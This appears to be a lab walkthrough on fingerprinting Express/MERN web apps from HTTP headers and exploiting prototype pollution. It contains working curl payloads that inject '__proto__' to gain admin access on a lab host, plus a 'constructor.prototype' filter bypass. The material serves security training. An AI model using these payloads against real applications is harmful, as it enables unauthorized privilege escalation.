# Modern Web Stacks

Fingerprinting modern web stacks from passive HTTP signals, then exploiting a known vulnerability in each. One stack per section — more added as the room progresses.

---

**Table of contents**

- [MERN stack](#mern-stack)

---

## MERN stack

**MERN** = MongoDB, Express.js, React, Node.js — the default for JavaScript-only teams that want one language across the whole stack. Express is minimal by design, so developers write a lot of their own utility code, and that custom code is where the bugs usually are.

**Typical Ubuntu deployment:** Node.js (NodeSource), Express on port **3000/5000**, MongoDB on **27017**, usually behind an Nginx reverse proxy in production — but often directly exposed on internal tools.

### Fingerprinting

Identify the stack *before* sending any payloads. Start with the response headers:

```bash
curl -I 10.130.132.26:3000/
```

| Signal | Value | Confidence |
| --- | --- | --- |
| `X-Powered-By` header | `Express` | High |
| `Set-Cookie` header | `connect.sid=s%3A...` | High |
| Unhandled route | `Cannot GET /nonexistent` (plain text) | High |
| Frontend root element | `<div id="root">` in HTML body | Medium |

- **`X-Powered-By: Express`** — sent on every response by default. Absent only if the dev called `app.disable('x-powered-by')`, added Helmet, or a reverse proxy (Vercel, Cloudflare, Railway) stripped it. If missing, fall back to the other signals.
- **`connect.sid` cookie** — from `express-session`. Present with `saveUninitialized: true`; with `saveUninitialized: false` it only appears after a session is created, so its absence does **not** rule out Express.
- **Unhandled route** — a default Express app returns plain text `Cannot GET /path`, distinct from Django, Apache, and Next.js error pages:

```bash
curl http://10.130.132.26:3000/nonexistent   # -> Cannot GET /nonexistent
```

### Exploiting — Prototype Pollution

After fingerprinting, enumerate the API surface. MERN apps expose JSON endpoints and often merge user input into objects with custom, unfiltered merge functions — the classic home of **prototype pollution**.

| Endpoint | Method | Purpose |
| --- | --- | --- |
| `/api/user/update` | POST | Merges submitted JSON into the session user object |
| `/api/admin/flag` | GET | Returns the flag if the user has admin access |

**The concept:** every JS object inherits from a shared `Object.prototype`. A merge function that accepts a `__proto__` key writes the property onto `Object.prototype` itself — so *every* object in the Node process then resolves `.isAdmin` as `true` via the prototype chain, even without its own property.

```bash
# 1. Confirm the admin route is gated
curl -c cookies.txt http://10.130.132.26:3000/
curl -b cookies.txt http://10.130.132.26:3000/api/admin/flag
# -> {"error":"Not authorized"}

# 2. Pollute the prototype through the unfiltered merge
curl -b cookies.txt -X POST http://10.130.132.26:3000/api/user/update \
  -H "Content-Type: application/json" -d '{"__proto__": {"isAdmin": true}}'
# -> {"status":"updated"}

# 3. Admin check now resolves true via the prototype chain
curl -b cookies.txt http://10.130.132.26:3000/api/admin/flag
# -> {"flag":"..."}
```

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Tip:</strong> If <code>__proto__</code> is filtered at the input layer, the <code>constructor.prototype</code> path — <code>{"constructor": {"prototype": {"isAdmin": true}}}</code> — reaches <code>Object.prototype</code> by a different route and can bypass that filter.
</div>

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>Warning:</strong> Prototype pollution mutates global process state. Only run it against authorized targets — it can affect other users and crash the app.
</div>
